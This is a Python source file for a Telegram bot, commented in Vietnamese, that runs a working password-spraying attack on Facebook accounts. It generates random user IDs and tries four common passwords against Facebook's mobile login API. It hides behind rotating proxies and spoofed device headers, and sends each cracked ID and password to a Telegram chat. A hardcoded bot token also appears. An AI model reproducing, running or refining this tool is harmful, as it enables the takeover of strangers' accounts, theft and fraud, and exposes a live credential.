import os
import asyncio
import random
import uuid
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# ---------- Cấu hình ----------
TOKEN="8377931268:AAGkN2B6OVjamYf7kskT0wgoM9S2Hp9waUQ"

loop_count = 0
oks = []
stop_flag = False
scan_task = None
proxy_pool = []          # danh sách proxy sống (ip:port hoặc user:pass@ip:port)
proxy_lock = threading.Lock()   # lock để bảo vệ proxy_pool khi đọc/ghi từ nhiều thread
count_lock = threading.Lock()   # lock bảo vệ biến đếm

# ---------- Hàm kiểm tra proxy ----------
def check_proxy(proxy_str):
    """Trả về True nếu proxy sống."""
    try:
        proxies = {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}",
        }
        r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=8)
        return r.status_code == 200
    except:
        return False

async def load_live_proxies():
    """Đọc proxy.txt, kiểm tra và cập nhật proxy_pool. Chỉ gọi khi cần."""
    global proxy_pool
    if not os.path.exists("proxy.txt"):
        with proxy_lock:
            proxy_pool = []
        return 0

    with open("proxy.txt", "r") as f:
        raw = [line.strip() for line in f if line.strip()]

    if not raw:
        with proxy_lock:
            proxy_pool = []
        return 0

    # Kiểm tra đồng thời
    loop = asyncio.get_running_loop()
    with ThreadPoolExecutor(max_workers=30) as pool:
        results = await asyncio.gather(
            *[loop.run_in_executor(pool, check_proxy, p) for p in raw]
        )
    live = [raw[i] for i, ok in enumerate(results) if ok]
    with proxy_lock:
        proxy_pool = live
    return len(live)

# ---------- Hàm login (method A) ----------
def window1():
    """Random User-Agent giả Windows."""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def creationyear(uid):
    """Đoán năm tạo Facebook từ UID."""
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9,10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def attempt_login(uid, proxy_str=None):
    """
    Thử đăng nhập method A.
    Trả về (uid, password, year) nếu OK, ngược lại None.
    """
    global loop_count, oks
    session = requests.Session()
    if proxy_str:
        session.proxies = {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}",
        }
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                timeout=15,
                allow_redirects=False
            ).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                year = creationyear(uid)
                with count_lock:
                    loop_count += 1
                    oks.append(uid)
                return (uid, pw, year)
        with count_lock:
            loop_count += 1
    except Exception:
        with count_lock:
            loop_count += 1
    return None

# ---------- Vòng quét vô hạn (nền) ----------
async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, loop_count, oks, proxy_pool
    executor = ThreadPoolExecutor(max_workers=100)
    batch_size = 300          # batch nhỏ hơn để phản hồi nhanh
    star = '10000'
    try:
        # Nếu chưa có proxy pool, mới load lần đầu
        if not proxy_pool:
            await context.bot.send_message(chat_id, "⏳ Đang kiểm tra proxy lần đầu...")
            count = await load_live_proxies()
            if count == 0:
                await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy (có thể bị giới hạn).")
            else:
                await context.bot.send_message(chat_id, f"✅ Đã nạp {count} proxy sống.")
        else:
            await context.bot.send_message(chat_id, f"🚀 Bắt đầu quét ngay với {len(proxy_pool)} proxy có sẵn.")

        await context.bot.send_message(chat_id, "🔄 Quét đã khởi động...")

        while not stop_flag:
            # Tạo danh sách UID
            ids = []
            for _ in range(batch_size):
                suffix = str(random.randint(1000000000, 1999999999))
                uid = star + suffix
                ids.append(uid)

            # Lấy proxy ngẫu nhiên cho mỗi UID (an toàn với lock)
            with proxy_lock:
                current_proxies = proxy_pool.copy() if proxy_pool else []
            tasks = []
            loop = asyncio.get_running_loop()
            for uid in ids:
                proxy = random.choice(current_proxies) if current_proxies else None
                tasks.append(loop.run_in_executor(executor, attempt_login, uid, proxy))

            # Chạy và thu kết quả
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if isinstance(res, tuple) and len(res) == 3:
                    uid, pw, year = res
                    msg = (
                        f"> Tiền về sếp ơi\n"
                        f"> Via: {year}\n"
                        f"> UID: `{uid}`\n"
                        f"> Pass: `{pw}`\n"
                        f"> Chi tiết: https://facebook.com/{uid}"
                    )
                    await context.bot.send_message(chat_id, msg, parse_mode=ParseMode.MARKDOWN_V2)

            # Cập nhật tiến độ mỗi 10 batch (tùy chọn)
            if loop_count % (batch_size * 10) == 0 and loop_count > 0:
                await context.bot.send_message(
                    chat_id,
                    f"> 📊 Đã quét: {loop_count} UID\n> ✅ OK: {len(oks)}",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            # Nghỉ ngắn
            await asyncio.sleep(0.3)

    except asyncio.CancelledError:
        pass
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Lỗi trong vòng quét: {e}")
    finally:
        executor.shutdown(wait=False)
        await context.bot.send_message(chat_id, "⏹️ Đã dừng quét.")

# ---------- Lệnh Telegram ----------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = (
        "🤖 *Xin chào\\! Đây là bot dò tài khoản Facebook cũ \\(method A\\)\\.*\n"
        "Sử dụng /help để xem danh sách lệnh\\.\n"
        "Bot chạy trên nền tảng Railway, dùng proxy từ file `proxy\\.txt`"
    )
    await update.message.reply_text(welcome, parse_mode=ParseMode.MARKDOWN_V2)

async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, scan_task
    chat_id = update.effective_chat.id
    if scan_task and not scan_task.done():
        await update.message.reply_text("⚠️ Bot đang quét rồi.")
        return

    stop_flag = False
    application = context.application
    scan_task = application.create_task(scan_loop_wrapper(chat_id, context), name="scan_task")
    await update.message.reply_text("✅ Lệnh /scan đã được kích hoạt. Bot bắt đầu quét vô hạn (method A).")

async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, scan_task
    stop_flag = True
    if scan_task:
        scan_task.cancel()
        scan_task = None
    await update.message.reply_text("🛑 Đang dừng quét...")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global loop_count, oks, proxy_pool
    with proxy_lock:
        proxy_count = len(proxy_pool)
    msg = (
        f"> 📊 Đã quét: {loop_count} UID\n"
        f"> ✅ Tài khoản OK: {len(oks)}\n"
        f"> 🌐 Proxy sống hiện có: {proxy_count}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)

async def ipprx_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔎 Đang kiểm tra proxy... Vui lòng đợi (có thể mất vài phút).")
    count = await load_live_proxies()
    if count == 0:
        await update.message.reply_text("⚠️ Không có proxy sống.")
        return
    # Ghi proxy sống ra file
    with open("live_proxies.txt", "w") as f:
        with proxy_lock:
            for p in proxy_pool:
                f.write(p + "\n")
    with open("live_proxies.txt", "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename="live_proxies.txt",
            caption=f"🌐 Danh sách {count} proxy sống đã lọc."
        )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📋 *Danh sách lệnh*\n"
        "> /start \\- Khởi động bot\n"
        "> /scan \\- Bắt đầu quét vô hạn\n"
        "> /stop \\- Dừng quét\n"
        "> /status \\- Xem tiến độ\n"
        "> /ipprx \\- Lọc proxy sống và gửi file\n"
        "> /help \\- Hiển thị trợ giúp này"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN_V2)

# ---------- Main ----------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("scan", start_scan))
    app.add_handler(CommandHandler("stop", stop_scan))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("ipprx", ipprx_cmd))
    app.add_handler(CommandHandler("help", help_cmd))

    print("🤖 Bot đã khởi động...")
    app.run_polling()

if __name__ == "__main__":
    main()
